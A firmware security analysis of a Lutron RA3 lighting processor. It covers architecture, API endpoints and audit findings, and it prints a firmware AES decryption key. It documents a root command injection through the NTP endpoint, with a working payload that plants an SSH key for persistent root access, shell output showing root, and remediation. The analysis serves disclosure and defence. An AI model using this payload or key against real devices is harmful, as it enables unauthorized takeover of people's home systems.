# Phoenix RA3 Processor Rootfs Analysis (v26.01.13f000)

Decrypted from `firmware-downloads.iot.lutron.io/phoenix/final/26.01.13f000/lutron_firmware`
using AES-128-CBC key `6cba80b2bf3cf2a63be017340f1801d8` extracted from Phoenix eMMC.

Rootfs extracted to `data/firmware/phoenix/v26.01.13f000/`.

## Architecture Overview

AM335x (Cortex-A8) running Linux 5.10, BusyBox, with Silicon Labs EFR32 coprocessor(s)
for all RF communication. Go services handle LEAP/LAP/HAP; C++ `lutron-core` handles
radio protocol engine.

### Key Binaries

| Binary | Size | Lang | Purpose |
|--------|------|------|---------|
| `multi-server-phoenix.gobin` | 30MB | Go | LEAP/LAP/HAP/MQTT server |
| `lutron-core` | 25MB | C++ | Core protocol engine (CCA+CCX) |
| `domain-object-manager.gobin` | 14MB | Go | Database/object management |
| `secure-channel.gobin` | 8MB | Go | Encrypted comms (WebSocket/TLS) |
| `internet-connectivity-monitor.gobin` | 3.5MB | Go | Cloud connectivity watchdog |
| `lutron-eol` | 1.2MB | C++ | Factory test server (port 3490) |
| `secure-element-engine` | 419KB | C++ | ATECC608 secure element driver |
| `lutron-button-engine` | 291KB | C++ | Button/pico event processor |
| `lutron-core-client` | 239KB | C++ | Core IPC client |
| `lutron-led-ui` | 218KB | C++ | LED indicator controller |
| `lutron-eeprom-engine` | 110KB | C++ | EEPROM R/W daemon |

## Radio Architecture: EFR32 Coprocessors

The AM335x does NOT directly interface with any radio. All RF goes through
Silicon Labs EFR32 coprocessor(s) via UART/HDLC using the CLAP protocol
(Clear-connect Link Abstraction Protocol).

### Coprocessor Communication

- Protocol: CLAP over HDLC framing over UART
- Baud rate: 230400
- Source: `core-support/lutron-hdlc/lutron-hdlc.cpp`, `core-support/lutron-coproc-manager/clap-link-manager/`
- Coprocessor firmware: S19 format, e.g. `SB_EFR_128K_00.00.03.s19`
- CLAP tunnel socket: `/tmp/ClapTunnelServer.sock`

### Link Drivers in lutron-core

| Driver | Protocol | Frequency |
|--------|----------|-----------|
| `CCA_LINK_DRIVER` | CCA (433 MHz) | Link types 7, 9, 11 |
| `PEGASUS_LINK_DRIVER` | CCX/Thread (2.4 GHz) | Link type 31 |
| `GLINK_LINK_DRIVER` | QS Link (wired RS-485) | Wired |

### Hardware Variants (rfs_* overlays)

Each overlay configures `etc/lutron.d/lutron.conf` for a different product SKU:

| Overlay | ttyS1 (Link 0) | ttyS2 (Link 1) | Product |
|---------|-----------------|-----------------|---------|
| `rfs_wireless` | Pegasus (CCX, type 31) | -- | RA3 standard |
| `rfs_janus` | Pegasus (CCX, type 31) | James RF (CCA, type 9) | RA3 dual-radio |
| `rfs_wired` | QS (CCA, type 7) | QS (CCA, type 7) | HWQSX 2-link |
| `rfs_wired_one_link` | QS (CCA, type 7) | -- | HWQSX 1-link |
| `rfs_zero_link` | (none) | (none) | Wired-only/test |

Janus = dual-radio RA3 processor with both CCX and CCA coprocessors. This is how RA3
bridges legacy CCA devices (picos, dimmers) into the Thread mesh.

### Link Types (from domain-object-info.sqlite)

| ID | Description |
|----|-------------|
| 7 | QS Link |
| 9 | Clear Connect A (Caseta/RA2) |
| 11 | HomeWorks Clear Connect A |
| 30 | Vive Clear Connect Link |
| 31 | Clear Connect X (Pegasus) |
| 33 | GreenPHY |
| 34 | DALI Type 8 |

## CCX/Thread Implementation

Thread stack is **fully proprietary** — zero OpenThread references. The EFR32MG12 NCP
runs the complete Thread mesh stack. Linux sees only CLAP frames.

Key modules in lutron-core:
- `modules/pegasus-firmware-update/` — OTA firmware distribution
- `modules/pegasus-startup/` — Network info exchange, device addressing
- `modules/experimental-ccx-network-beacon/` — Mesh health beacons
- `modules/link-diagnostics/ccx-network-graph/` — Topology tracking
- `modules/clear-connect-addressing-mode/receiver/pegasus-link-receiver/` — Device pairing

### Secure Element (ATECC608)

I2C bus 1, address 0xC0, 16 slots:

| Slot | Type | Purpose |
|------|------|---------|
| 0-4 | ECC private | Integration/client TLS keys |
| 5 | ECC private | Spare |
| 6 | AES-128 | Firmware decryption key (from external file) |
| 7 | AES-128 | AESKey1Shared |
| 8 | Secret data | SecretData1 |
| 9 | AES-128 | AESKey2Shared |
| 10-11 | AES-128 | Processor-specific (internal) |
| 12-13 | ECC public | Firmware signature verification |
| 14 | ECC public | Spare |
| 15 | Secret data | SecretData2 |

## CCX Device Firmware Codenames

From `device-firmware-manifest.json` and `phoenix-device-firmware-package.tar.gz`:

| Codename | DeviceClass | Device Type |
|----------|------------|-------------|
| dart | 0x045E/045F/0127/0467 | Diva Smart / Darter (dimmer, switch, keypad, fan) |
| thin-mint | 0x1B060101 | Sunnata dimmer |
| thin-mint-remodeler | 0x1B060301 | Sunnata dimmer (remodeler) |
| powerbird | 0x012B-012E | Sunnata toggle/hybrid devices |
| hercules | 0x1626/1627 | Occupancy/vacancy sensor |
| lorikeet | 0x061A0101 | MG12-based repeater (confirms EFR32MG12) |
| omnikeet | 0x061E0101 | Repeater variant |
| kit-kat | 0x06190201 | RF dongle internal engine ("drone master") |
| rf-dongle | 0x06190201 | USB RF dongle (processor) |
| bulb | 0x1B010101 | Ketra smart bulb |
| downlight | 0x1B030101 | Ketra downlight module |
| lutron-dynamic | 0x1B080101 | Ketra dynamic panel/tile |
| rania-lamp | 0x1B090101 | Ketra Rania lamp |
| robin-trimkit | 0x1B070301 | Ketra trim kit |
| n3-radio | 0x06140101 | N3 processor (radio + MQX RTOS + EFM32 LLE) |
| eagle-owl | 0x031201xx | CCA wired relay/dimmer |
| bananaquit-avis | 0x0314/030A | CCA occupancy sensor |
| basenji | 0x03150201 | CCA wired device |

Target locations: CCX = Thread, CCA = 433 MHz, LLE = Low Level Engine (EFM32),
LightEngine = dimming coprocessor, N3Wired = MQX RTOS.

## LEAP API

384 endpoint handlers, 773 object types, 14 communique types. See below for full inventory.

### Transport

| Protocol | Port | Transport | Max Clients |
|----------|------|-----------|-------------|
| LEAP cleartext | 8080 | TCP, localhost only | -- |
| LEAP TLS | 8081 | JSON/TLS | 10 |
| LAP | 8083 | mTLS | 25 integrators |
| HAP (HomeKit) | 4548 | TCP | 20 |
| McLEAP | UDP 2647 | Multicast 239.255.255.255 | -- |

### CommuniqueTypes

ReadRequest/Response, CreateRequest/Response, UpdateRequest/Response,
DeleteRequest/Response, SubscribeRequest/Response, UnsubscribeRequest/Response,
ExceptionResponse, CommandResponse.

### Resource Inventory (major categories)

**Core**: `/area`, `/zone`, `/device`, `/button`, `/buttongroup`, `/link`,
`/server`, `/controlstation`, `/virtualbutton`, `/preset`

**Occupancy**: `/occupancygroup`, `/occupancysensor`, `/detectiongroup`

**Scheduling**: `/timeclock`, `/timeclockevent`, `/dailyschedule`, `/weeklyschedule`,
`/countdowntimer`, `/sequence`

**Load control**: `/loadcontroller`, `/zonecontroller`, `/zonetypegroup`, `/load`,
`/fadesettings`, `/ledsettings`, `/led`, `/cci`, `/phasesettings`, `/tuningsettings`

**Shading**: `/shadegroup`

**Lighting features**: `/emergency`, `/daylightsensor`, `/daylightinggaingroup`,
`/naturallightoptimization`, `/naturalshow`, `/daynightmode`, `/curve`

**Presets** (32 assignment types): dimmedlevel, switchedlevel, fanspeed, shadelevel,
shadelevelwithtilt, shadelevelwithtiltwhenclosed, ccolevel, colortuninglevel,
spectrumtuninglevel, whitetuninglevel, warmdim, receptaclelevel, raiselower,
areascene, favoritecycle, nexttrack, pause, playpausetoggle, sonosplay,
occupancysensorsettings, occupancysettings, startemergency, stopemergency, startsequence

**Integrations**: `/service/alexa`, `/service/googlehome`, `/service/homekit`,
`/service/ifttt`, `/service/sonos`, `/service/bacnet`, `/service/ketra`,
`/service/ntpserver`, `/service/openadr`, `/service/autoprog`

**System**: `/system`, `/project`, `/login`, `/clientsetting`, `/ping`,
`/networkinterface`, `/certauthority`, `/datasecurity`, `/nonce`

**Operations**: `/firmwareupdatesession`, `/devicefirmwarepackageupdatesession`,
`/database`, `/databasetransfersession`, `/profilesession`, `/auditlog`,
`/operation/status`

**Previously unknown**: `/intruderdeterrent` (security/alarm), `/rentablespace`
(hospitality), `/thirdpartydevice`, `/alias`

### Subscription Endpoints (44 total)

`/area`, `/area/{id}`, `/area/{id}/status`, `/zone`, `/zone/{id}`, `/zone/{id}/status`,
`/device`, `/device/{id}`, `/device/status/availability`, `/device/status/batterystatus`,
`/button/{id}/status/event`, `/link/{id}/status`, `/virtualbutton`,
`/loadcontroller/{id}/status`, `/occupancysensor/{id}/status`, `/daylightsensor/{id}/status`,
`/emergency/{id}/status`, `/system/status`, `/system/loadshedding/status`,
`/temperaturesensor/status`, `/timeclock/status`, `/timeclockevent/status`,
`/naturallightoptimization/{id}/status`, `/operation/status`, `/project`,
`/profilesession/{id}/status`, `/rentablespace/status`,
`/service/bacnet/settings`, `/service/bacnet/networksettings/{id}`,
and paged/expanded variants.

## Security Audit

### Authentication
- **Root is passwordless** — `root::0:0::/root:/bin/sh`, no shadow file
- SSH: pubkey only, `AllowUsers root support ssh-credentials-transfer u_db-transfer-mngmt u_fwu u_dfp`
- Baked-in SSH key: `abhat@PC0008690` (Lutron employee) in `/home/support/.ssh/authorized_keys`
- Remote SSH key injection: Lutron can push authorized_keys via SFTP credential transfer,
  verified against cert chain (root CA: `lutron-ssh-root`)

### Hardcoded Secrets
- **Firmware decryption keys**: plaintext in `/etc/lutron.d/secure_element_external_keys/`
- **Hotel integration RSA key**: 1024-bit private key at `/etc/hotel-integration/keys/hotelintegration.rsa`
- **Sonos API keys**: 3 UUIDs in `/etc/sonos/sonos_api_keys.json`
- AWS credentials: fetched dynamically (not hardcoded) -- correct approach

### Network Services
| Port | Service | Auth |
|------|---------|------|
| 22 | SSH | Pubkey only |
| 443 | Secure Channel | TLS |
| 3490 | EOL test server | Client cert (runs on every boot!) |
| 4548 | HomeKit HAP | HAP pairing |
| 5353 | mDNS | None |
| 8081 | LEAP TLS | Cert-based |
| 8083 | LAP TLS | mTLS |
| 2647/udp | McLEAP multicast | None |

### Remote Access Paths
1. MQTT via AWS IoT Core (provisioned through `device-login.lutron.com`)
2. AWS IoT Secure Tunneling (`localproxy` binary)
3. SOCKS5 tunnel (`hev-socks5-tunnel`, creates tun0 interface)
4. SSH credential injection (SFTP + cert-verified tar.gz)

### Firewall
- Default INPUT: DROP (good)
- Default OUTPUT: ACCEPT (permissive)
- SSH outbound blocked
- Rate limiting on input rules (100/sec burst 10)

### Telemetry
Fluent-bit ships metrics to AWS Kinesis: CPU, dmesg, battery, zone activity,
occupancy events, energy reports, HVAC metrics, firmware updates, watchdog resets, core dumps.

### File Integrity
`S98-custom-script` checks MD5 sums of critical system binaries (monit, libc, libssl, rsyslogd)
but does NOT checksum SSH keys, firmware decryption keys, or the EOL binary.

## Confirmed Vulnerability: LEAP → Root Shell via eval Injection

**Severity**: Critical (CVSS ~8.8) — CWE-78 (OS Command Injection) via CWE-95 (Eval Injection)

### Summary

Any LEAP integrator can achieve root code execution on the RA3 processor by setting
the NTP server endpoint to a crafted string containing shell metacharacters. The value
passes through an unsafe `eval` in `sqlite_helper.sh` which is used by every shell script
that reads from the platform database.

### Vulnerable Code

`usr/sbin/sqlite_helper.sh` line 42:
```sh
eval "${__return_result}='${sqlite_result}'"
```

`sqlite_result` contains the raw value from SQLite (e.g., the NTP endpoint). If it
contains a single quote `'`, it breaks out of the eval quoting and the remainder
executes as arbitrary shell commands — as root.

### Exploit Chain

1. Attacker sends LEAP `UpdateRequest` to `/service/ntpserver/1`:
   ```json
   {"NTPServerEndpoint":{"Endpoint":"'; COMMAND; echo '"}}
   ```
2. Go binary stores the value in SQLite via parameterized query (no SQL injection,
   but the VALUE is attacker-controlled)
3. Platform triggers chrony config reload → `updateChronyConfHelperScript.sh`
4. Script calls `getNtpUrl.sh` → `sqlite_helper.sh:execute_sqlite_query()`
5. `eval "result=''; COMMAND; echo ''"` executes COMMAND as root
6. Trigger is automatic — occurs on NTP config change

### Proof of Concept (tested 2026-04-01 on v26.01.13f000)

Payload to inject SSH authorized key for persistent root access:
```
'; mkdir -p /root/.ssh; echo 'ssh-ed25519 AAAA... user' >> /root/.ssh/authorized_keys; echo '
```

Result:
```
$ ssh -i ~/.ssh/id_ed25519_lutron root@10.0.0.1
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
Lutron-08676308
# uname -a
Linux Lutron-08676308 5.10.208-001-ts-armv7l #1 Thu Mar 5 02:56:32 UTC 2026 armv7l GNU/Linux
```

### Prerequisites

- Valid LEAP TLS certificate (integrator pairing via `/server/leap/pairing`)
- Network access to processor port 8081

### Scope

`sqlite_helper.sh` is sourced by **every shell script** that reads from the database:
- `getNtpUrl.sh` (NTP endpoint) — confirmed exploitable
- `getNtpServerType.sh` (NTP type)
- `select_active_database.pyc` callers
- Any init script using `execute_sqlite_query()`

Any user-controllable string stored in the platform SQLite database that is later
read by a shell script via `sqlite_helper.sh` is a potential injection vector.
The NTP endpoint is the easiest because it's directly writable via LEAP with no
additional validation.

### Additional sed Vulnerability

`usr/sbin/updateChronyConfHelperScript.sh` line 114 also has an injection:
```sh
sed "s|#server CUSTOM_NTP_URL|server ${new_ntp_url}|g; ..." ${CHRONY_CONFIG_FILE} >...
```

The `|` sed delimiter in the value breaks the substitution. However, BusyBox sed
lacks the GNU `e` flag, so this is limited to chrony config injection (time
manipulation, NTP MITM) rather than direct code execution. The `eval` vulnerability
in `sqlite_helper.sh` is the more severe issue.

### Remediation

1. Replace `eval` with direct variable assignment: `printf -v "${__return_result}" '%s' "${sqlite_result}"`
2. Add input validation in the Go LEAP handler for NTP endpoint (hostname/IP only)
3. Quote all shell variables in sed expressions
